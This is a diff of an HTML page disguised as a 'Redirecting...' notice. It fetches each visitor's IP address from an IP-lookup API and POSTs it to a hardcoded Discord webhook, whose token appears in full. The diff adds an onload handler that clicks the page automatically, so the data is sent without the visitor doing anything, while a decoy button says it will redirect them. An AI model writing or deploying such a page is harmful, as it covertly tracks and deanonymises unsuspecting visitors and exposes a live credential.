@@ -4,11 +4,12 @@
   <meta charset="UTF-8"> 
   <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
   <title>Redirecting...</title> 
- </head> 
- <body> 
-<h1>Redirecting...</h1>
-<p1>this may take up to some few seconds</p1>
-<script>
+    <script>
+    
+    window.onload = function(){
+      document.getElementById('onClick').click();
+    }
+    
     var message;
     
     function json(url) {
@@ -20,6 +21,7 @@ json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
   message = data.ip;
 });
 
+function sendData() {
   var request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/855010994963349504/7jaFAyZ8sIO0X4A_fWSrHHq85ALVGQffsP0F6ownrFMxgKwTU808G36cheJ7Vm2SdvCw ");
 
@@ -33,6 +35,11 @@ json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
    
   request.send(JSON.stringify(params));
 }
+
 </script>
-</body>
+ </head> 
+ <body id="onClick" onclick="sendData()">
+  <button id="onClick" onclick="sendData()">click here</button>
+  <p1>to redirect if it won't automatically redirect you</p1>
+ </body>
 </html>
